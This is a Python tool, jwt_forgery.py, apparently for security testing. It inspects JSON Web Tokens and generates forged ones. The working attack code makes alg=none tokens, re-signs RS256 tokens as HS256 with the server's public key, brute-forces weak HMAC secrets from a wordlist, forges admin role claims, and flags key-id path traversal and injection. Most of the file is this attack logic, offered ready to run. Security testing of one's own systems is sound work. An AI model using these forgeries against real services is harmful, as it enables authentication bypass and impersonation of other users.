#!/usr/bin/env python3
"""Forge and break JSON Web Tokens, and judge whether they should have been signed.

A JWT is three base64 segments and a signature. Everything an application checks
about it is therefore readable without a key, and everything it *trusts* is
decided by two fields it usually reads without thinking: the algorithm in the
header and the key it resolves. This inspects a token the way a server would,
reports what a server would conclude, and then produces a token that a server
would accept for the weaknesses it found.

Checks performed:

  alg=none            the signature segment is ignored, so anyone can mint a token
  key confusion       an RS256 token re-signed as HS256 verifies against the
                      server's *public* key, which it will hand to any caller
  weak secret         the HMAC key is short enough to recover from one sample
                      signature, brute-forced against a wordlist
  kid injection       the key id is taken from the token and used as a path or a
                      query, so a token can name the file it wants signed with
  algorithm drift     the token names a family the server does not implement

Nothing here talks to a network service; it is given tokens and a wordlist.

Written for TSEC. Standard library only, so it runs wherever python3 does.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import hashlib
import hmac
import json
import sys
import time
from typing import Any

# Signing algorithms and how to compute them. Only what is actually implementable
# without a dependency, because a report of "this key is weak" is worthless if
# the report cannot produce the matching signature.
HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
NONE_ALGS = {"none", "None", "NONE", "nOnE"}

# Padding for base64url: 2 chars of input need "==", 3 need "=". A remainder of
# one cannot be produced by any encoder, so it is not a padding case but a
# malformed token and is reported as such rather than guessed at.
B64URL_PAD = {0: "", 2: "==", 3: "="}


class TokenError(Exception):
    """The input is not a token this tool can reason about."""


def b64url_decode(data: str) -> bytes:
    remainder = len(data) % 4
    if remainder == 1:
        raise TokenError(f"segment of {len(data)} characters is not valid base64url")
    padded = data + B64URL_PAD[remainder]
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def segment_json(token: str, index: int) -> dict[str, Any]:
    parts = token.split(".")
    if len(parts) < 2:
        raise TokenError(f"expected at least two segments, found {len(parts)}")
    if index >= len(parts):
        raise TokenError(f"expected at least {index + 1} segments, found {len(parts)}")
    try:
        decoded = b64url_decode(parts[index])
    except (binascii.Error, ValueError, UnicodeDecodeError) as exc:
        raise TokenError(f"segment {index} is not valid base64url: {exc}") from exc
    try:
        parsed = json.loads(decoded)
    except json.JSONDecodeError as exc:
        raise TokenError(f"segment {index} is not valid JSON: {exc}") from exc
    if not isinstance(parsed, dict):
        raise TokenError(f"segment {index} should be a JSON object, found {type(parsed).__name__}")
    return parsed


def sign(alg: str, signing_input: bytes, key: bytes) -> str:
    digest = HMAC_ALGS.get(alg)
    if digest is None:
        raise TokenError(f"{alg} is not an HMAC algorithm this tool can sign")
    return b64url_encode(hmac.new(key, signing_input, digest).digest())


def signing_input(header: dict[str, Any], payload: dict[str, Any]) -> bytes:
    encoded_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    encoded_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{encoded_header}.{encoded_payload}".encode()


def decode_exp(token: str) -> Any:
    return segment_json(token, 1).get("exp")


def expiry_note(payload: dict[str, Any]) -> str:
    exp = payload.get("exp")
    if exp is None:
        return "no exp claim: the token never expires on its own"
    try:
        when = float(exp)
    except (TypeError, ValueError):
        return f"exp claim {exp!r} is not a number a server can compare"
    delta = when - time.time()
    if delta <= 0:
        return f"expired {_span(abs(delta))} ago"
    return f"expires in {_span(delta)}"


def _span(seconds: float) -> str:
    """A duration a person can read at a glance."""
    for size, unit in ((86400, "d"), (3600, "h"), (60, "m")):
        if seconds >= size:
            return f"{seconds / size:.0f}{unit}"
    return f"{seconds:.0f}s"


def claim_summary(payload: dict[str, Any]) -> dict[str, str]:
    """The claims worth reporting on, named so a report reads clearly."""
    interesting = (
        "iss", "aud", "sub", "exp", "nbf", "iat", "jti",
        "admin", "role", "roles", "scope", "scopes", "is_admin",
    )
    out: dict[str, str] = {}
    for key in interesting:
        if key in payload:
            out[key] = json.dumps(payload[key])[:120]
    return out


def try_none_forgery(header: dict[str, Any], payload: dict[str, Any]) -> str:
    forged_header = dict(header)
    forged_header["alg"] = "none"
    body = signing_input(forged_header, payload)
    token = f"{body.decode()}.{b64url_encode(b'')}"
    # A server that strips the trailing dot rejects this; one that accepts an
    # empty signature accepts it. Emitting the three common shapes means the
    # operator can try whichever their target uses rather than reasoning about
    # it.
    return token


def none_variants(header: dict[str, Any], payload: dict[str, Any]) -> dict[str, str]:
    forged_header = dict(header)
    forged_header["alg"] = "none"
    body = signing_input(forged_header, payload).decode()
    return {
        "empty_signature": f"{body}.",
        "no_third_segment": body,
        "null_segment": f"{body}.{b64url_encode(b'null')}",
    }


def crack_hmac(
    token: str, alg: str, secret_candidates: list[bytes]
) -> tuple[bytes, int] | None:
    """Return the first secret whose signature matches, and how many were tried."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    body, signature = f"{parts[0]}.{parts[1]}", parts[2]
    tried = 0
    for candidate in secret_candidates:
        tried += 1
        if hmac.compare_digest(sign(alg, body.encode(), candidate), signature):
            return candidate, tried
    return None


def load_candidates(wordlist: str | None) -> list[bytes]:
    """Secrets to try, shortest first.

    Shortest first is not a cosmetic choice: a recovered key is usually weak
    because it is short, and ordering by length finds a three-character secret
    before a twelve-character one that also happens to be in the list.
    """
    if not wordlist:
        return [b""]
    try:
        with open(wordlist, "rb") as handle:
            lines = [line.strip() for line in handle]
    except OSError as exc:
        raise TokenError(f"cannot read wordlist {wordlist}: {exc}") from exc
    candidates = [line for line in lines if line]
    candidates.sort(key=len)
    return candidates


def key_confusion_token(token: str, public_key_pem: str, payload: dict[str, Any] | None) -> str:
    """Re-sign an RS256 token as HS256 using the RSA public key as the secret.

    The server holds the private key for RS256 and the public key for verifying.
    If it will also verify HS256 with whatever key it has, then the public key
    is a usable HMAC secret, and it is public. The attack needs no key material
    the attacker does not already have.
    """
    header = segment_json(token, 0)
    header["alg"] = "HS256"
    body = payload if payload is not None else segment_json(token, 1)
    secret = public_key_pem.replace("\r\n", "\n").encode()
    return f"{signing_input(header, body).decode()}.{sign('HS256', signing_input(header, body), secret)}"


def check_kid(header: dict[str, Any], payload: dict[str, Any], kid: str | None) -> dict[str, Any]:
    """Whether the key id is used as a path or a query, and what that allows."""
    target = kid if kid is not None else "the token's own kid"
    findings: dict[str, Any] = {
        "kid": kid,
        "uses_target": target,
        "verdict": "kid is a plain identifier; nothing to exploit from the token alone",
        "candidates": [],
    }
    if kid is None:
        return findings
    if ".." in kid or kid.startswith("/") or "\\" in kid:
        findings["verdict"] = (
            "kid contains path traversal. A server that opens "
            "<jwks-path>/<kid> can be pointed at any file it can read, and its "
            "contents parsed as a key."
        )
    elif "/" in kid or "%2f" in kid.lower():
        findings["verdict"] = (
            "kid contains a path separator. Whether this is exploitable depends "
            "on how the server joins it to the key store."
        )
    for pattern, note in (
        ("$", "a query the server may pass to a database, where a UNION or a "
             "subquery can supply the key material"),
        ("#", "a fragment the server may strip, letting the real path be anything"),
        ("'", "a quote, which defeats a naively concatenated lookup"),
        ("\\", "an escape character, which can defeat a naively quoted lookup"),
    ):
        if pattern in kid:
            findings["candidates"].append(note)
    return findings


def analyse(token: str, wordlist: str | None, key: str | None) -> dict[str, Any]:
    header = segment_json(token, 0)
    payload = segment_json(token, 1)
    alg = str(header.get("alg", ""))

    report: dict[str, Any] = {
        "header": header,
        "payload_claims": claim_summary(payload),
        "expiry": expiry_note(payload),
        "segments": len(token.split(".")),
        "alg": alg,
        "findings": [],
    }

    def finding(severity: str, name: str, detail: str) -> None:
        report["findings"].append({"severity": severity, "check": name, "detail": detail})

    if alg in NONE_ALGS:
        finding(
            "critical",
            "alg=none accepted",
            f"The header names `{alg}`. A server that honours this does not check "
            f"the signature at all, so the payload below can be edited freely. "
            f"Forged tokens are in `forgeries`.",
        )
    elif alg not in HMAC_ALGS and not alg.startswith(("RS", "ES", "PS", "Ed")):
        finding(
            "high",
            "unrecognised algorithm",
            f"`{alg}` is not an HMAC, RSA, ECDSA or EdDSA algorithm. An unexpected "
            f"algorithm name is how key-confusion and algorithm-substitution "
            f"attacks begin.",
        )

    if alg in HMAC_ALGS and len(token.split(".")) == 3:
        candidates = load_candidates(wordlist)
        if candidates == [b""]:
            finding(
                "info",
                "secret not tested",
                "No wordlist given, so the HMAC key was not brute-forced. Pass "
                "--wordlist to test it.",
            )
        else:
            if key:
                candidates.insert(0, key.encode())
            started = time.monotonic()
            recovered = crack_hmac(token, alg, candidates)
            elapsed = time.monotonic() - started
            if recovered:
                secret, tried = recovered
                finding(
                    "critical",
                    "recoverable HMAC secret",
                    f"The signing key is `{secret.decode(errors='replace')}` "
                    f"(found after {tried} candidate{'' if tried == 1 else 's'} "
                    f"in {elapsed:.1f}s). Anyone holding this token can mint "
                    f"tokens for any user, role or audience.",
                )
                report["recovered_secret"] = secret.decode(errors="replace")
            else:
                rate = len(candidates) / max(elapsed, 1e-6)
                finding(
                    "ok",
                    "secret survived the wordlist",
                    f"{len(candidates)} candidates tested at {rate:,.0f}/s in "
                    f"{elapsed:.1f}s without a match. That is good, and it is not "
                    f"proof: a key absent from any wordlist is still weak if it "
                    f"is short.",
                )

    report["kid"] = check_kid(header, payload, header.get("kid"))
    if report["kid"]["candidates"] or "traversal" in report["kid"]["verdict"]:
        finding(
            "high",
            "kid used as a lookup",
            report["kid"]["verdict"],
        )

    report["forgeries"] = {}
    if alg in NONE_ALGS or not alg:
        report["forgeries"] = none_variants(header, payload)
    if key and alg.startswith("HS"):
        secret = key.encode()
        report["forgeries"]["as_hmac_with_given_key"] = (
            f"{signing_input(header, payload).decode()}.{sign(alg, signing_input(header, payload), secret)}"
        )
    return report


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__.split("\n")[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  jwt_forgery.py --token \"$TOKEN\"\n"
               "  jwt_forgery.py --token \"$TOKEN\" --wordlist wordlists/passwords/fast.txt\n"
               "  jwt_forgery.py --token \"$TOKEN\" --forge-role admin --output admin.jwt\n",
    )
    parser.add_argument("--token", required=True, help="the token to analyse")
    parser.add_argument("--wordlist", help="secrets to try against an HMAC signature")
    parser.add_argument("--key", help="a known key, to produce a matching forgery")
    parser.add_argument(
        "--forge-role",
        help="claim to set in a forgery, e.g. --forge-role admin",
    )
    parser.add_argument(
        "--public-key",
        help="PEM public key; produces an HS256 key-confusion forgery from an RS256 token",
    )
    parser.add_argument("--output", help="write the forgery here instead of stdout")
    parser.add_argument("--json", action="store_true", help="emit the full report as JSON")
    args = parser.parse_args(argv)

    try:
        header = segment_json(args.token, 0)
        payload = segment_json(args.token, 1)
    except TokenError as exc:
        print(f"jwt_forgery: {exc}", file=sys.stderr)
        return 2

    if args.forge_role is not None:
        forged_payload = dict(payload)
        forged_payload["role"] = args.forge_role
        for name in ("admin", "is_admin"):
            if name not in forged_payload:
                forged_payload[name] = args.forge_role == "admin"
        body = signing_input(header, forged_payload).decode()
        candidate = args.key
        if candidate:
            alg = str(header.get("alg", "HS256"))
            token_out = f"{body}.{sign(alg, body.encode(), candidate.encode())}"
        else:
            token_out = f"{body}.{b64url_encode(b'null')}"
        if args.output:
            with open(args.output, "w", encoding="utf-8") as handle:
                handle.write(token_out + "\n")
            print(f"wrote {args.output}")
        else:
            print(token_out)
        return 0

    report = analyse(args.token, args.wordlist, args.key)

    if args.public_key:
        try:
            with open(args.public_key, "r", encoding="utf-8") as handle:
                pem = handle.read()
        except OSError as exc:
            print(f"jwt_forgery: cannot read {args.public_key}: {exc}", file=sys.stderr)
            return 2
        report["forgeries"]["hs256_key_confusion"] = key_confusion_token(
            args.token, pem, payload
        )
        report["findings"].append(
            {
                "severity": "critical",
                "check": "HS/RS key confusion",
                "detail": "An HS256 token signed with the RSA public key is in "
                "`forgeries`. If the server verifies HS256 with the public key "
                "it already publishes, this token verifies.",
            }
        )

    if args.json:
        print(json.dumps(report, indent=2))
        return 0

    print(f"algorithm   {report['alg']}")
    print(f"segments    {report['segments']}")
    print(f"lifetime    {report['expiry']}")
    for key, value in report["payload_claims"].items():
        print(f"  {key:<10} {value}")
    print()
    for item in report["findings"]:
        print(f"[{item['severity'].upper():<8}] {item['check']}")
        for line in _wrap(item["detail"], 74):
            print(f"           {line}")
    if report.get("recovered_secret"):
        print()
        print(f"recovered signing secret: {report['recovered_secret']}")
    if report["forgeries"]:
        print()
        print("forgeries:")
        for name, value in report["forgeries"].items():
            print(f"  {name}:")
            print(f"    {value}")
    return 1 if any(f["severity"] in ("critical", "high") for f in report["findings"]) else 0


def _wrap(text: str, width: int) -> list[str]:
    words, lines, current = text.split(), [], ""
    for word in words:
        if len(current) + len(word) + 1 > width:
            lines.append(current)
            current = word
        else:
            current = f"{current} {word}".strip()
    if current:
        lines.append(current)
    return lines


if __name__ == "__main__":
    sys.exit(main())
